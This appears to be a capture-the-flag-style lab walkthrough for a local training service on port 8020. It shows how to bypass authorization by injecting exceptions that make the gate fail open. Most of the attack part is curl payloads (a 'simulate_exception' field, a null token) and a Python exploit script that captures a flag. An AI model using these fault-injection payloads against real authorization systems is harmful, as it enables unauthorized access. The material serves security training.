# Practical Walkthrough: Exploitation & Verification (A10)

This guide walks you through detecting, exploiting, and verifying exception-handling failures and fail-open vulnerabilities on the **Zitera Payment & Security Gate (Port 8020)**. You will test baseline gate behavior, inject intentional upstream exception conditions (*fault injection*), bypass authorization checks via insecure fail-open logic, and verify laboratory completion.

---

## 4-Tier Mission Progression Methodology

```
[Tier 1: Observation (15%)] ──> [Tier 2: Fault Injection (25%)] ──> [Tier 3: Weaponization (35%)] ──> [Tier 4: Verification (25%)]
   Inspect Health Probe &         Transmit Standard Invalid Token     Inject Upstream Fault Payload       Verify Mission Target &
    Gate Status Baseline               (Access Denied)                   (Fail-Open Bypass Active)           Reset Gate State
```

---

## Tier 1: Observation & Attack Surface Mapping (15%)

Begin by probing the baseline health and mission status on port 8020.

### 1.1 Service Health Probe (Manual cURL)
Execute a service liveness probe:

```bash
curl -i -s http://localhost:8020/health
```

Expected response:
```json
{"status": "ok", "lab": "A10", "port": 8020}
```

### 1.2 Initial Practice Verification Check (Manual cURL)
Query the automated verification endpoint to establish your starting baseline:

```bash
curl -i -s http://localhost:8020/practice/verify
```

Expected response:
```json
{
  "status": "failed",
  "message": "Practice target pending: Induce an upstream parsing/timeout exception via POST /api/gate/verify to trigger fail-open behavior."
}
```

---

## Tier 2: Fault Injection & Anomaly Testing (25%)

Examine how the gateway evaluates standard user requests when presented with unauthorized tokens.

### 2.1 Submit Arbitrary Invalid Token (Manual cURL)
Submit an HTTP POST request carrying an unrecognized token:

```bash
curl -i -X POST http://localhost:8020/api/gate/verify \
  -H "Content-Type: application/json" \
  -d '{"token": "unauthorized_guest_token"}'
```

The gateway responds:
```json
{
  "authorized": false,
  "fail_open_state": false,
  "message": "Access denied"
}
```

The system correctly denies access (`authorized: false`). Without knowing the internal master token `super_authorized_token`, normal clearance is refused.

---

## Tier 3: Weaponization & Fault-Induced Bypass (35%)

Now perform *Fault Injection*: deliver malformed or trigger payloads designed to induce an unhandled exception inside the transaction processing logic.

### 3.1 Triggering Exceptional Conditions (Manual cURL)
Several distinct payloads induce an upstream exception inside `/api/gate/verify`:

**Method A: Providing `simulate_exception`**
```bash
curl -i -X POST http://localhost:8020/api/gate/verify \
  -H "Content-Type: application/json" \
  -d '{"simulate_exception": "UPSTREAM_TIMEOUT"}'
```

**Method B: Passing Explicit `null` Token**
```bash
curl -i -X POST http://localhost:8020/api/gate/verify \
  -H "Content-Type: application/json" \
  -d '{"token": null}'
```

The server response reveals a catastrophic security failure:
```json
{
  "authorized": true,
  "fail_open_state": true,
  "message": "Access granted via fail-open fallback.",
  "flag": "ZITERA{...}"
}
```

Despite never providing a valid credential, the exception catch block fell back to **granting unauthenticated clearance (`authorized: true`)**!

### 3.2 Automated Python Exploitation Script (`exploit_fail_open.py`)

Create and execute the following Python script to automate the bypass:

```python
import json
import urllib.request

TARGET_URL = "http://localhost:8020/api/gate/verify"

fault_payload = {
    "simulate_exception": "UPSTREAM_FRAUD_SERVICE_TIMEOUT"
}

req = urllib.request.Request(
    TARGET_URL,
    data=json.dumps(fault_payload).encode("utf-8"),
    headers={"Content-Type": "application/json"},
    method="POST"
)

try:
    with urllib.request.urlopen(req) as response:
        body = response.read().decode("utf-8")
        result = json.loads(body)
        print("[+] HTTP Status:", response.status)
        print("[+] Authorized Status:", result.get("authorized"))
        print("[+] Fail-Open State:", result.get("fail_open_state"))
        print("[+] Message:", result.get("message"))
        if "flag" in result:
            print("\n[+] Challenge Flag Successfully Captured!")
            print("[+] Flag:", result["flag"])
except Exception as e:
    print("[-] Exploitation failed:", e)
```

Run the script:
```bash
python exploit_fail_open.py
```

---

## Tier 4: Verification & Defensive State Audit (25%)

### 4.1 Automated Lab Target Verification
Audit lab completion using the practice verification endpoint:

```bash
curl -s http://localhost:8020/practice/verify
```

Expected verification response:
```json
{
  "status": "passed",
  "message": "Exceptional condition failure reproduced: Upstream exception caused the gate to fail-open and authorize transaction!"
}
```

### 4.2 Reset Gate State
Reset the gate state to its factory baseline:

```bash
curl -X POST http://localhost:8020/api/reset
```

Confirm that the gate has returned to its fail-closed default:
```bash
curl -s http://localhost:8020/practice/verify
```
The response should confirm `status: "failed"`.
